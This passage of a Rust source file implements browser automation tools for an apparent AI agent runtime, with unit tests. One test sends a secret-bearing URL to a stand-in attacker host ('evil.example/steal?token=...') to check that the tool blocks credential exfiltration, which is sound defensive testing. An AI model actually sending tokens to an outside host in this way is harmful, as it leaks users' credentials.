        let mut paths = vec![local_bin];
        paths.extend(env::split_paths(&command_path));
        if let Ok(joined) = env::join_paths(paths) {
            command_path = joined;
        }
    }
    process.env("PATH", command_path);
    process.env("AGENT_BROWSER_SOCKET_DIR", &socket_dir);
    process.env(
        "AGENT_BROWSER_IDLE_TIMEOUT_MS",
        env::var("AGENT_BROWSER_IDLE_TIMEOUT_MS").unwrap_or_else(|_| IDLE_TIMEOUT_MS.to_string()),
    );

    #[cfg(unix)]
    {
        if env::var_os("AGENT_BROWSER_CHROME_FLAGS").is_none() {
            let uid = unsafe { libc::geteuid() };
            if uid == 0 {
                process.env(
                    "AGENT_BROWSER_CHROME_FLAGS",
                    "--no-sandbox --disable-dev-shm-usage",
                );
            }
        }
    }

    let mut child = process
        .spawn()
        .map_err(|error| format!("starting agent-browser {command} failed: {error}"))?;

    let deadline = Instant::now() + Duration::from_secs(timeout_secs.max(1));
    let status = loop {
        if let Some(status) = child
            .try_wait()
            .map_err(|error| format!("waiting for agent-browser {command} failed: {error}"))?
        {
            break status;
        }
        if Instant::now() >= deadline {
            let _ = child.kill();
            let _ = child.wait();
            let _ = fs::remove_file(&stdout_path);
            let _ = fs::remove_file(&stderr_path);
            return Err(format!("Command timed out after {timeout_secs} seconds"));
        }
        thread::sleep(Duration::from_millis(100));
    };

    let stdout = fs::read_to_string(&stdout_path).unwrap_or_default();
    let stderr = fs::read_to_string(&stderr_path).unwrap_or_default();
    let _ = fs::remove_file(&stdout_path);
    let _ = fs::remove_file(&stderr_path);

    let stdout = stdout.trim();
    let stderr = stderr.trim();

    if command == "screenshot" {
        let combined = if stdout.is_empty() {
            stderr.to_string()
        } else if stderr.is_empty() {
            stdout.to_string()
        } else {
            format!("{stdout}\n{stderr}")
        };
        if let Some(path) = extract_screenshot_path_from_text(&combined)
            && Path::new(&path).is_file()
        {
            return Ok(json!({
                "success": true,
                "data": {
                    "path": path,
                }
            }));
        }
    }

    if stdout.is_empty() {
        if status.success() {
            return Err(format!("Browser command '{command}' returned no output"));
        }
        let fallback = if stderr.is_empty() {
            format!("Browser command '{command}' failed")
        } else {
            stderr.to_string()
        };
        return Err(fallback);
    }

    serde_json::from_str(stdout).map_err(|_| {
        let raw = if stdout.len() > 500 {
            format!("{}...", &stdout[..500])
        } else {
            stdout.to_string()
        };
        if status.success() {
            format!("Non-JSON output from agent-browser for '{command}': {raw}")
        } else if stderr.is_empty() {
            format!("Non-JSON output from agent-browser for '{command}': {raw}")
        } else {
            stderr.to_string()
        }
    })
}

fn normalize_ref(reference: &str) -> String {
    if reference.starts_with('@') {
        reference.to_string()
    } else {
        format!("@{reference}")
    }
}

fn required_non_empty_string(args: &Value, key: &str) -> Result<String, String> {
    let Some(value) = args.get(key) else {
        return Err(format!("{key} is required"));
    };
    string_arg_value(value, key)
}

fn string_arg(args: &Value, key: &str) -> Result<String, String> {
    let Some(value) = args.get(key) else {
        return Err(format!("{key} is required"));
    };
    match value {
        Value::String(text) => Ok(text.clone()),
        _ => Err(format!("{key} must be a string")),
    }
}

fn string_arg_value(value: &Value, key: &str) -> Result<String, String> {
    let Some(text) = value.as_str() else {
        return Err(format!("{key} must be a string"));
    };
    let trimmed = text.trim();
    if trimmed.is_empty() {
        return Err(format!("{key} must not be empty"));
    }
    Ok(trimmed.to_string())
}

fn optional_non_empty_string(args: &Value, key: &str) -> Result<Option<String>, String> {
    match args.get(key) {
        None | Some(Value::Null) => Ok(None),
        Some(value) => string_arg_value(value, key).map(Some),
    }
}

fn optional_bool(args: &Value, key: &str) -> Result<Option<bool>, String> {
    match args.get(key) {
        None | Some(Value::Null) => Ok(None),
        Some(Value::Bool(value)) => Ok(Some(*value)),
        Some(_) => Err(format!("{key} must be a boolean")),
    }
}

fn optional_timeout_seconds(args: &Value, key: &str) -> Result<Option<u64>, String> {
    let Some(value) = args.get(key) else {
        return Ok(None);
    };
    match value {
        Value::Null => Ok(None),
        Value::Number(number) => {
            let Some(timeout) = number.as_f64() else {
                return Err(format!("{key} must be a number"));
            };
            if !timeout.is_finite() {
                return Err(format!("{key} must be a finite number"));
            }
            let clamped = timeout.clamp(1.0, MAX_CDP_TIMEOUT_SECS as f64).round() as u64;
            Ok(Some(clamped.max(1)))
        }
        _ => Err(format!("{key} must be a number")),
    }
}

fn browser_error(message: impl Into<String>) -> String {
    tool_result(json!({
        "success": false,
        "error": message.into(),
    }))
}

fn command_success(value: &Value) -> bool {
    value
        .get("success")
        .and_then(Value::as_bool)
        .unwrap_or(false)
}

fn command_error(value: &Value) -> String {
    value
        .get("error")
        .and_then(Value::as_str)
        .unwrap_or("Browser command failed")
        .to_string()
}

fn command_data(value: &Value) -> &Value {
    value.get("data").unwrap_or(&Value::Null)
}

fn parse_browser_eval_result(value: Option<&Value>) -> Value {
    let Some(value) = value else {
        return Value::Null;
    };
    match value {
        Value::String(text) => {
            serde_json::from_str::<Value>(text).unwrap_or_else(|_| value.clone())
        }
        _ => value.clone(),
    }
}

fn truncate_snapshot(snapshot: &str) -> String {
    if snapshot.len() <= SNAPSHOT_TRUNCATE_CHARS {
        return snapshot.to_string();
    }

    let mut lines = Vec::new();
    let mut chars = 0_usize;
    for line in snapshot.lines() {
        if chars + line.len() + 1 > SNAPSHOT_TRUNCATE_CHARS.saturating_sub(80) {
            break;
        }
        lines.push(line.to_string());
        chars += line.len() + 1;
    }
    let remaining = snapshot.lines().count().saturating_sub(lines.len());
    if remaining > 0 {
        lines.push(String::new());
        lines.push(format!(
            "[... {remaining} more lines truncated, use browser_snapshot for full content]"
        ));
    }
    lines.join("\n")
}

fn extract_screenshot_path_from_text(text: &str) -> Option<String> {
    if text.trim().is_empty() {
        return None;
    }

    for marker in ["Screenshot saved to '", "Screenshot saved to \""] {
        if let Some(start) = text.find(marker) {
            let rest = &text[start + marker.len()..];
            let quote = marker.chars().last()?;
            if let Some(end) = rest.find(quote) {
                let candidate = rest[..end].trim();
                if candidate.starts_with('/') && candidate.ends_with(".png") {
                    return Some(candidate.to_string());
                }
            }
        }
    }

    if let Some(start) = text.find("Screenshot saved to ") {
        let rest = &text[start + "Screenshot saved to ".len()..];
        if let Some(candidate) = rest.split_whitespace().next() {
            let candidate = candidate.trim().trim_matches('\'').trim_matches('"');
            if candidate.starts_with('/') && candidate.ends_with(".png") {
                return Some(candidate.to_string());
            }
        }
    }

    for token in text.split_whitespace() {
        let candidate = token.trim().trim_matches('\'').trim_matches('"');
        if candidate.starts_with('/') && candidate.ends_with(".png") {
            return Some(candidate.to_string());
        }
    }

    None
}

fn json_type_name(value: &Value) -> &'static str {
    match value {
        Value::Null => "null",
        Value::Bool(_) => "bool",
        Value::Number(_) => "number",
        Value::String(_) => "str",
        Value::Array(_) => "list",
        Value::Object(_) => "dict",
    }
}

fn contains_secret_like_url(url: &str) -> bool {
    if contains_embedded_secret(url) {
        return true;
    }
    let decoded = percent_decode(url);
    decoded != url && contains_embedded_secret(&decoded)
}

fn percent_decode(input: &str) -> String {
    let bytes = input.as_bytes();
    let mut output = Vec::with_capacity(bytes.len());
    let mut index = 0;
    while index < bytes.len() {
        if bytes[index] == b'%'
            && index + 2 < bytes.len()
            && let (Some(high), Some(low)) =
                (hex_value(bytes[index + 1]), hex_value(bytes[index + 2]))
        {
            output.push((high << 4) | low);
            index += 3;
            continue;
        }
        output.push(bytes[index]);
        index += 1;
    }
    String::from_utf8_lossy(&output).into_owned()
}

fn hex_value(byte: u8) -> Option<u8> {
    match byte {
        b'0'..=b'9' => Some(byte - b'0'),
        b'a'..=b'f' => Some(byte - b'a' + 10),
        b'A'..=b'F' => Some(byte - b'A' + 10),
        _ => None,
    }
}

fn browser_session_name(runtime: &ToolRuntime) -> String {
    let key = runtime
        .current_session_id()
        .map(str::to_string)
        .unwrap_or_else(|| runtime.cwd().display().to_string());
    format!("h_{:016x}", fnv1a64(key.as_bytes()))
}

fn fnv1a64(bytes: &[u8]) -> u64 {
    let mut hash = 0xcbf29ce484222325_u64;
    for byte in bytes {
        hash ^= u64::from(*byte);
        hash = hash.wrapping_mul(0x100000001b3);
    }
    hash
}

fn find_in_path(name: &str) -> Option<PathBuf> {
    let path = env::var_os("PATH")?;
    for entry in env::split_paths(&path) {
        let candidate = entry.join(name);
        if candidate.is_file() {
            return Some(candidate);
        }
    }
    None
}

fn default_hermes_home() -> PathBuf {
    env::var_os("HERMES_HOME")
        .map(PathBuf::from)
        .or_else(|| dirs::home_dir().map(|home| home.join(".hermes")))
        .unwrap_or_else(|| PathBuf::from(".hermes"))
}

fn repo_root() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("..")
        .join("..")
        .canonicalize()
        .unwrap_or_else(|_| {
            PathBuf::from(env!("CARGO_MANIFEST_DIR"))
                .join("..")
                .join("..")
        })
}

fn cleanup_old_screenshots(directory: &Path, max_age: Duration) {
    let Ok(entries) = fs::read_dir(directory) else {
        return;
    };
    let cutoff = SystemTime::now()
        .checked_sub(max_age)
        .unwrap_or(SystemTime::UNIX_EPOCH);
    for entry in entries.flatten() {
        let path = entry.path();
        if !path.is_file() {
            continue;
        }
        let Some(name) = path.file_name().and_then(|value| value.to_str()) else {
            continue;
        };
        if !name.starts_with("browser_screenshot_") || !name.ends_with(".png") {
            continue;
        }
        let Ok(metadata) = entry.metadata() else {
            continue;
        };
        let Ok(modified) = metadata.modified() else {
            continue;
        };
        if modified < cutoff {
            let _ = fs::remove_file(path);
        }
    }
}

fn unix_ts_nanos() -> u128 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|duration| duration.as_nanos())
        .unwrap_or(0)
}

#[cfg(test)]
mod tests {
    use super::*;

    use std::io::{Read, Write};
    use std::net::TcpListener;
    use std::os::unix::fs::PermissionsExt;
    use std::sync::Mutex;
    use std::thread;

    use tempfile::TempDir;

    static ENV_LOCK: Mutex<()> = Mutex::new(());

    #[test]
    fn browser_blocks_secret_bearing_urls() {
        let runtime = ToolRuntime::default();
        let result = handle_browser_navigate(
            &json!({"url":"https://evil.example/steal?token=sk%2Dtest%2Dsecret"}),
            &runtime,
        );
        let parsed: Value = serde_json::from_str(&result).unwrap();
        assert_eq!(parsed["success"], json!(false));
        assert_eq!(parsed["error"], json!(BLOCKED_URL_SECRET_ERROR));
    }

    #[test]
    fn browser_blocks_policy_urls() {
        let temp = TempDir::new().unwrap();
        fs::write(
            temp.path().join("config.yaml"),
            "security:\n  website_blocklist:\n    enabled: true\n    domains:\n      - blocked.example\n",
        )
        .unwrap();
        let runtime = ToolRuntime::default().with_hermes_home(temp.path());
        let result =
            handle_browser_navigate(&json!({"url":"https://blocked.example/docs"}), &runtime);
        let parsed: Value = serde_json::from_str(&result).unwrap();
        assert_eq!(parsed["success"], json!(false));
        assert_eq!(
            parsed["blocked_by_policy"]["host"],
            json!("blocked.example")
        );
    }

    #[test]
    fn browser_tools_run_against_fake_agent_browser_cli() {
        let _guard = ENV_LOCK.lock().unwrap();
        let temp = TempDir::new().unwrap();
        let bin_dir = temp.path().join("bin");
        fs::create_dir_all(&bin_dir).unwrap();
        let cli = bin_dir.join("agent-browser");
        fs::write(
            &cli,
            r#"#!/usr/bin/env bash
set -e
cmd=""
arg1=""
for ((i=1; i<=$#; i++)); do
  if [ "${!i}" = "--json" ]; then
    j=$((i+1))
    cmd="${!j}"
    k=$((i+2))
    if [ $k -le $# ]; then
      arg1="${!k}"
    fi
    break
  fi
done
case "$cmd" in
  open)
    echo '{"success":true,"data":{"title":"Example","url":"https://example.com"}}'
    ;;
  snapshot)
    echo '{"success":true,"data":{"snapshot":"[ref=@e1] Search\n[ref=@e2] Submit","refs":{"@e1":{},"@e2":{}}}}'
    ;;
  click)
    echo '{"success":true}'
    ;;
  fill)
    echo '{"success":true}'
    ;;
  scroll)
    echo '{"success":true}'
    ;;
  back)
    echo '{"success":true,"data":{"url":"https://example.com/previous"}}'
    ;;
  press)
    echo '{"success":true}'
    ;;
  console)
    echo '{"success":true,"data":{"messages":[{"type":"log","text":"hello"}]}}'
    ;;
  errors)
    echo '{"success":true,"data":{"errors":[{"message":"boom"}]}}'
    ;;
  eval)
    if printf '%s' "$arg1" | grep -q 'document.images'; then
      echo '{"success":true,"data":{"result":"[{\"src\":\"https://example.com/image.png\",\"alt\":\"Hero\",\"width\":640,\"height\":480}]"}}'
    else
      echo '{"success":true,"data":{"result":"\"Example\""}}'
    fi
    ;;
  screenshot)
    out="${@: -1}"
    mkdir -p "$(dirname "$out")"
    printf '\x89PNG\r\n\x1a\n\x00\x00\x00\x00\x00\x00\x00\x00' > "$out"
    if printf '%s\n' "$@" | grep -qx -- '--annotate'; then
      printf '{"success":true,"data":{"path":"%s","annotations":[{"label":"1","ref":"@e1"}]}}\n' "$out"
    else
      printf 'Screenshot saved to %s\n' "$out"
    fi
    ;;
  *)
    echo '{"success":false,"error":"unexpected command"}'
    ;;
esac
"#,
        )
        .unwrap();
        let mut permissions = fs::metadata(&cli).unwrap().permissions();
        permissions.set_mode(0o755);
        fs::set_permissions(&cli, permissions).unwrap();

        let old_path = env::var_os("PATH");
        let joined = env::join_paths(
            [bin_dir.clone()].into_iter().chain(
                old_path
                    .as_ref()
                    .map(env::split_paths)
                    .into_iter()
                    .flatten(),
            ),
        )
        .unwrap();
        unsafe {
            env::set_var("PATH", joined);
        }

        let runtime = ToolRuntime::new(temp.path()).with_hermes_home(temp.path());

        let (base_url, server) = serve_chat_completion(json!({
            "choices": [{
                "message": {
                    "content": "The screenshot shows Example."
                },
                "finish_reason": "stop"
            }]
        }));
        fs::write(
            temp.path().join("config.yaml"),
            format!(
                "model:\n  default: gpt-4.1-mini\n  provider: openai\n  base_url: {base_url}\n  api_key: test-key\n"
            ),
        )
        .unwrap();

        let navigate = handle_browser_navigate(&json!({"url":"https://example.com"}), &runtime);
        let navigate_json: Value = serde_json::from_str(&navigate).unwrap();
        assert_eq!(navigate_json["success"], json!(true));
        assert_eq!(navigate_json["title"], json!("Example"));
        assert_eq!(navigate_json["element_count"], json!(2));

        let click = handle_browser_click(&json!({"ref":"e2"}), &runtime);
        let click_json: Value = serde_json::from_str(&click).unwrap();
        assert_eq!(click_json["clicked"], json!("@e2"));

        let console = handle_browser_console(&json!({}), &runtime);
        let console_json: Value = serde_json::from_str(&console).unwrap();
        assert_eq!(console_json["total_messages"], json!(1));
        assert_eq!(console_json["total_errors"], json!(1));

        let eval = handle_browser_console(&json!({"expression":"document.title"}), &runtime);
        let eval_json: Value = serde_json::from_str(&eval).unwrap();
        assert_eq!(eval_json["result"], json!("Example"));
        assert_eq!(eval_json["result_type"], json!("str"));

        let images = handle_browser_get_images(&json!({}), &runtime);
        let images_json: Value = serde_json::from_str(&images).unwrap();
        assert_eq!(images_json["count"], json!(1));
        assert_eq!(
            images_json["images"][0]["src"],
            json!("https://example.com/image.png")
        );

        let invalid = handle_browser_scroll(&json!({"direction":"left"}), &runtime);
        let invalid_json: Value = serde_json::from_str(&invalid).unwrap();
        assert_eq!(invalid_json["success"], json!(false));

        let vision = handle_browser_vision(
            &json!({"question":"What is shown on the page?","annotate":true}),
            &runtime,
        );
        let vision_json: Value = serde_json::from_str(&vision).unwrap();
        assert_eq!(vision_json["success"], json!(true));
        assert_eq!(
            vision_json["analysis"],
            json!("The screenshot shows Example.")
        );
        assert_eq!(vision_json["annotations"][0]["ref"], json!("@e1"));
        assert!(
            vision_json["screenshot_path"]
                .as_str()
                .unwrap()
                .ends_with(".png")
        );
        server.join().unwrap();

        match old_path {
            Some(value) => unsafe { env::set_var("PATH", value) },
            None => unsafe { env::remove_var("PATH") },
        }
    }

    #[test]
    fn browser_cdp_available_reads_config() {
        let _guard = ENV_LOCK.lock().unwrap();
        let temp = TempDir::new().unwrap();
        fs::write(
            temp.path().join("config.yaml"),
            "browser:\n  cdp_url: ws://127.0.0.1:9222/devtools/browser/test\n",
        )
        .unwrap();

        let old_home = env::var_os("HERMES_HOME");
        let old_cdp = env::var_os("BROWSER_CDP_URL");
        unsafe {
            env::set_var("HERMES_HOME", temp.path());
            env::remove_var("BROWSER_CDP_URL");
        }

        assert!(browser_cdp_available());

        match old_home {
            Some(value) => unsafe { env::set_var("HERMES_HOME", value) },
            None => unsafe { env::remove_var("HERMES_HOME") },
        }
        match old_cdp {
            Some(value) => unsafe { env::set_var("BROWSER_CDP_URL", value) },
            None => unsafe { env::remove_var("BROWSER_CDP_URL") },
        }
    }

    #[test]
    fn browser_cdp_calls_websocket_endpoint_with_target_attach() {
        let _guard = ENV_LOCK.lock().unwrap();
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let server = thread::spawn(move || {
            let (stream, _) = listener.accept().unwrap();
            let mut websocket = tungstenite::accept(stream).unwrap();

            let attach = websocket.read().unwrap().into_text().unwrap();
            let attach_json: Value = serde_json::from_str(&attach).unwrap();
            assert_eq!(attach_json["method"], json!("Target.attachToTarget"));
            assert_eq!(attach_json["params"]["targetId"], json!("page-1"));
            let attach_id = attach_json["id"].as_i64().unwrap();
            websocket
                .send(Message::Text(
                    json!({
                        "id": attach_id,
                        "result": {
                            "sessionId": "session-1"
                        }
                    })
                    .to_string()
                    .into(),
                ))
                .unwrap();

            let call = websocket.read().unwrap().into_text().unwrap();
            let call_json: Value = serde_json::from_str(&call).unwrap();
            assert_eq!(call_json["method"], json!("Runtime.evaluate"));
            assert_eq!(call_json["sessionId"], json!("session-1"));
            assert_eq!(call_json["params"]["expression"], json!("1 + 1"));
            let call_id = call_json["id"].as_i64().unwrap();
            websocket
                .send(Message::Text(
                    json!({
                        "id": call_id,
                        "result": {
                            "value": 2
                        }
                    })
                    .to_string()
                    .into(),
                ))
                .unwrap();
        });

        let old_cdp = env::var_os("BROWSER_CDP_URL");
        unsafe {
            env::set_var(
                "BROWSER_CDP_URL",
                format!("ws://{}/devtools/browser/test", addr),
            );
        }

        let runtime = ToolRuntime::default();
        let result = handle_browser_cdp(
            &json!({
                "method": "Runtime.evaluate",
                "params": {
                    "expression": "1 + 1"
                },
                "target_id": "page-1",
                "timeout": 5
            }),
            &runtime,
        );
        let parsed: Value = serde_json::from_str(&result).unwrap();
        assert_eq!(parsed["success"], json!(true));
        assert_eq!(parsed["method"], json!("Runtime.evaluate"));
        assert_eq!(parsed["target_id"], json!("page-1"));
        assert_eq!(parsed["result"]["value"], json!(2));

        match old_cdp {
            Some(value) => unsafe { env::set_var("BROWSER_CDP_URL", value) },
            None => unsafe { env::remove_var("BROWSER_CDP_URL") },
        }
        server.join().unwrap();
    }

    #[test]
    fn browser_dialog_calls_cdp_with_explicit_target() {
        let _guard = ENV_LOCK.lock().unwrap();
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let server = thread::spawn(move || {
            let (stream, _) = listener.accept().unwrap();
            let mut websocket = tungstenite::accept(stream).unwrap();

            let attach = websocket.read().unwrap().into_text().unwrap();
            let attach_json: Value = serde_json::from_str(&attach).unwrap();
            assert_eq!(attach_json["method"], json!("Target.attachToTarget"));
            assert_eq!(attach_json["params"]["targetId"], json!("page-1"));
            let attach_id = attach_json["id"].as_i64().unwrap();
            websocket
                .send(Message::Text(
                    json!({
                        "id": attach_id,
                        "result": {
                            "sessionId": "session-1"
                        }
                    })
                    .to_string()
                    .into(),
                ))
                .unwrap();

            let call = websocket.read().unwrap().into_text().unwrap();
            let call_json: Value = serde_json::from_str(&call).unwrap();
            assert_eq!(call_json["method"], json!("Page.handleJavaScriptDialog"));
            assert_eq!(call_json["sessionId"], json!("session-1"));
            assert_eq!(call_json["params"]["accept"], json!(true));
            assert_eq!(call_json["params"]["promptText"], json!("hello"));
            let call_id = call_json["id"].as_i64().unwrap();
            websocket
                .send(Message::Text(
                    json!({
                        "id": call_id,
                        "result": {}
                    })
                    .to_string()
                    .into(),
                ))
                .unwrap();
        });

        let old_cdp = env::var_os("BROWSER_CDP_URL");
        unsafe {
            env::set_var(
                "BROWSER_CDP_URL",
                format!("ws://{}/devtools/browser/test", addr),
            );
        }

        let runtime = ToolRuntime::default();
        let result = handle_browser_dialog(
            &json!({
                "action": "accept",
                "prompt_text": "hello",
                "target_id": "page-1",
                "timeout": 5
            }),
            &runtime,
        );
        let parsed: Value = serde_json::from_str(&result).unwrap();
        assert_eq!(parsed["success"], json!(true));
        assert_eq!(parsed["action"], json!("accept"));
        assert_eq!(parsed["target_id"], json!("page-1"));

        match old_cdp {
            Some(value) => unsafe { env::set_var("BROWSER_CDP_URL", value) },
            None => unsafe { env::remove_var("BROWSER_CDP_URL") },
        }
        server.join().unwrap();
    }

    #[test]
    fn browser_dialog_discovers_single_page_target() {
        let _guard = ENV_LOCK.lock().unwrap();
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let server = thread::spawn(move || {
            let (stream1, _) = listener.accept().unwrap();
            let mut websocket1 = tungstenite::accept(stream1).unwrap();
            let discovery = websocket1.read().unwrap().into_text().unwrap();
            let discovery_json: Value = serde_json::from_str(&discovery).unwrap();
            assert_eq!(discovery_json["method"], json!("Target.getTargets"));
            let discovery_id = discovery_json["id"].as_i64().unwrap();
            websocket1
                .send(Message::Text(
                    json!({
                        "id": discovery_id,
                        "result": {
                            "targetInfos": [
                                {
                                    "targetId": "page-42",
                                    "type": "page",
                                    "attached": false
                                }
                            ]
                        }
                    })
                    .to_string()
                    .into(),
                ))
                .unwrap();
            let _ = websocket1.close(None);

            let (stream2, _) = listener.accept().unwrap();
            let mut websocket2 = tungstenite::accept(stream2).unwrap();
            let attach = websocket2.read().unwrap().into_text().unwrap();
            let attach_json: Value = serde_json::from_str(&attach).unwrap();
            assert_eq!(attach_json["method"], json!("Target.attachToTarget"));
            assert_eq!(attach_json["params"]["targetId"], json!("page-42"));
            let attach_id = attach_json["id"].as_i64().unwrap();
            websocket2
                .send(Message::Text(
                    json!({
                        "id": attach_id,
                        "result": {
                            "sessionId": "session-42"
                        }
                    })
                    .to_string()
                    .into(),
                ))
                .unwrap();

            let call = websocket2.read().unwrap().into_text().unwrap();
            let call_json: Value = serde_json::from_str(&call).unwrap();
            assert_eq!(call_json["method"], json!("Page.handleJavaScriptDialog"));
            assert_eq!(call_json["sessionId"], json!("session-42"));
            assert_eq!(call_json["params"]["accept"], json!(false));
            let call_id = call_json["id"].as_i64().unwrap();
            websocket2
                .send(Message::Text(
                    json!({
                        "id": call_id,
                        "result": {}
                    })
                    .to_string()
                    .into(),
                ))
                .unwrap();
        });

        let old_cdp = env::var_os("BROWSER_CDP_URL");
        unsafe {
            env::set_var(
                "BROWSER_CDP_URL",
                format!("ws://{}/devtools/browser/test", addr),
            );
        }

        let runtime = ToolRuntime::default();
        let result = handle_browser_dialog(
            &json!({
                "action": "dismiss",
                "timeout": 5
            }),
            &runtime,
        );
        let parsed: Value = serde_json::from_str(&result).unwrap();
        assert_eq!(parsed["success"], json!(true));
        assert_eq!(parsed["action"], json!("dismiss"));
        assert_eq!(parsed["target_id"], json!("page-42"));

        match old_cdp {
            Some(value) => unsafe { env::set_var("BROWSER_CDP_URL", value) },
            None => unsafe { env::remove_var("BROWSER_CDP_URL") },
        }
        server.join().unwrap();
    }

    #[test]
    fn browser_dialog_rejects_dialog_id_routing() {
        let runtime = ToolRuntime::default();
        let result = handle_browser_dialog(
            &json!({
                "action": "accept",
                "dialog_id": "d-1"
            }),
            &runtime,
        );
        let parsed: Value = serde_json::from_str(&result).unwrap();
        assert_eq!(parsed["success"], json!(false));
        assert!(
            parsed["error"]
                .as_str()
                .unwrap()
                .contains("dialog_id routing is not ported")
        );
    }

    #[test]
    fn screenshot_path_recovery_handles_quoted_paths() {
        let text = "Screenshot saved to '/tmp/browser shot.png'";
        assert_eq!(
            extract_screenshot_path_from_text(text),
            Some("/tmp/browser shot.png".to_string())
        );
    }

    fn serve_chat_completion(body: Value) -> (String, thread::JoinHandle<()>) {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let response_body = body.to_string();
        let handle = thread::spawn(move || {
            let (mut stream, _) = listener.accept().unwrap();
            let mut request = Vec::new();
            let mut buffer = [0_u8; 4096];
            loop {
                let read = stream.read(&mut buffer).unwrap();
                if read == 0 {
                    break;
                }
                request.extend_from_slice(&buffer[..read]);
                if request.windows(4).any(|window| window == b"\r\n\r\n") {
                    break;
                }
            }
            let header_end = request
                .windows(4)
                .position(|window| window == b"\r\n\r\n")
                .unwrap()
                + 4;
            let headers = String::from_utf8_lossy(&request[..header_end]);
            let content_length = headers
                .lines()
                .find_map(|line| {
                    let (name, value) = line.split_once(':')?;
                    if name.eq_ignore_ascii_case("content-length") {
                        value.trim().parse::<usize>().ok()
                    } else {
                        None
                    }
                })
                .unwrap_or(0);
            let mut body_bytes = request[header_end..].to_vec();
            while body_bytes.len() < content_length {
                let read = stream.read(&mut buffer).unwrap();
                if read == 0 {
                    break;
                }
                body_bytes.extend_from_slice(&buffer[..read]);
            }
            let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                response_body.len(),
                response_body
            );
            let _ = body_bytes;
            stream.write_all(response.as_bytes()).unwrap();
        });
        (format!("http://{addr}/v1"), handle)
    }
}
